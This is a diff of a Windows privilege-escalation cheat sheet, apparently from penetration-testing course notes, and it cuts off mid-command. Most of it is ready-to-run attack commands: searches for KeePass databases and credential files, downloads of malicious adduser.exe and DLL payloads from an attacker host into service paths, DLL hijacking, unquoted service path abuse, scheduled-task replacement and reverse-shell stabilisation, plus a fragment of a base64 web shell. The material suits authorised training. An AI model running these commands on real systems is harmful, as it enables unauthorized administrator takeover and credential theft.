@@ -823,7 +823,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   Get-Process
   
   #Users
-  *Get-LocalUser
+  *Get-LocalUser （Need admin priviledge)
   
   #Group 
   *Get-LocalGroup
@@ -835,14 +835,14 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   ```
 
 - User's note  
-  - KeePass DB: .kdbx
-    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
-  - Text files: *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx
-    `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
-  - XAMP: .ini
+  - KeePass DB: .kdbx  
+    `Get-ChildItem -Path C:\Users\<user>\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
+  - Text files: *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx  
+    `Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
+  - XAMP: .ini  
     `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
-- Shell history
-  `(Get-PSReadlineOption).HistorySavePath type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`  
+- Shell history  
+  `(Get-PSReadlineOption).HistorySavePath`  
 - 🖥️ **Auotmated Enumeration - winPEASx64.exe**  
   - Download winPEAS to target and execute  
     ```
@@ -856,12 +856,21 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     PS C:\Users\dave> iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
     C:\Users\dave> .\winPEASx64.exe | Out-File winPEAS-results.txt
     ```
- - Review "Basic System Information", "PS default transcripts history", "Users", "Looking for possible password files in users homes"
+ - Review
+   - Basic System Information
+   - PS default transcripts history
+   - Users Information
+   - Looking for possible password files in users homes
+   - Current Token privileges
+   - Installed Applications
+   - Unquoted and Space detected
+   - Looking for possible password files in users homes
+   - Searching executable files in non-default folders with write
 - Leveraging Windows Services
   - Service Binary
-    - check for allowing full Read and Write access of program
+    - check for allowing full Read and Write access of program  
       `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
-    - check for non standard "C:\Windows\System32" path
+    - check for non standard "C:\Windows\System32" path  
       `C:\xampp\apache\bin\httpd.exe`  
       `C:\xampp\mysql\bin\mysqld.exe`  
     - check permissions for the running program
@@ -887,11 +896,11 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
       PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe  
       PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe  
       ```
-    - stop the service and restart it
-      `net stop mysql`
+    - stop the service and restart it  
+      `net stop mysql`  
     - reboot  
-      `shutdown /r /t 0`
-    - lower-privileged user replace the program with a malicious one
+      `shutdown /r /t 0`  
+    - lower-privileged user replace the program with a malicious one  
   - 🖥️ **Auotmated Priviledge Escalation - PowerUp.sp1**
     - Automates the enumeration of misconfigurations, weak permissions, and exploitable services. **Need bypass `powershell -ep bypass`**  
     - Download PowerUp.ps1 to target and run it
@@ -906,46 +915,46 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - Abuse the service
       `Install-ServiceBinary -Name 'mysql'`  #might receive error then back to manual approach  (adduser.c)  
   - DLL Hijacking
-    1. identify services running as SYSTEM or admin
-       `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
+    1. identify services running as SYSTEM or admin  
+       `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`  
        ```
        Get-Service | Where-Object {$_.StartType -eq 'Automatic' -and $_.Status -eq 'Running'}
        Import-Module .\PowerUp.ps1
        Invoke-AllChecks | Out-String -Stream | Select-String "DLL Hijack"
        ```
-    4. Find writable directory
-       `echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`
-       `Get-ChildItem "C:\Program Files\<TargetService>\" | ForEach-Object { icacls $_.FullName }`  
-    6. Create malicious DLL (add_admin.cpp)
+    4. Find writable directory  
+       `echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`  
+       `Get-ChildItem "C:\Program Files\<TargetService>\" | ForEach-Object { icacls $_.FullName }`   
+    6. Create malicious DLL (add_admin.cpp)  
        `x86_64-w64-mingw32-gcc <software>.cpp --shared -o <software>.dll`  
-    8. Deliver malicious DLL
+    8. Deliver malicious DLL  
        `iwr -uri http://<KALI>/<software>.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\<software>.dll'`  
-    10. Trigger execution
+    10. Trigger execution  
         `Restart-Service -Name <TargetService>`
-    12. stablize reverse shell
+    12. stablize reverse shell  
         `python3 -c 'import pty; pty.spawn("/bin/sh")'`  
-    14. post-exploitation and check for lateral movement or sensitive files
+    14. post-exploitation and check for lateral movement or sensitive files  
   - Unquoted Service Paths
-    - Windows service binaries that run with spaces in their path but without quotes.
-    - List Windows services with spaces in the path and missing quotes
+    - Windows service binaries that run with spaces in their path but without quotes.  
+    - List Windows services with spaces in the path and missing quotes  
       `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`  
       OR PowerUp tool `Get-ServiceUnquoted`  
-    - Check write permission
+    - Check write permission  
       `icacls "C:\"` `icacls "C:\Program Files"` `icacls "C:\Program Files\Enterprise Apps"`  
-    - Replace the program with malicious adduser.exe
+    - Replace the program with malicious adduser.exe  
       `iwr -uri http://<KALI>/adduser.exe -Outfile Current.exe`
       `copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'`
-    - Trigger execution
+    - Trigger execution  
       `Start-Service <service>`
-    - check creation of users
+    - check creation of users  
       `net user` `net localgroup administrators`
     - OR PowerUp tool `Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"`  
 - Scheduled Tasks
-  - List all scheduled tasks
+  - List all scheduled tasks  
     `schtasks /query /fo LIST /v`  
-  - Check permission
+  - Check permission  
     `icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe`  
-  - Repalce the schedule task
+  - Repalce the schedule task  
     ```
     iwr -Uri http://<KALI>/adduser.exe -Outfile BackendCacheCleanup.exe
     move .\BackendCacheCleanup.exe .\Pictures\
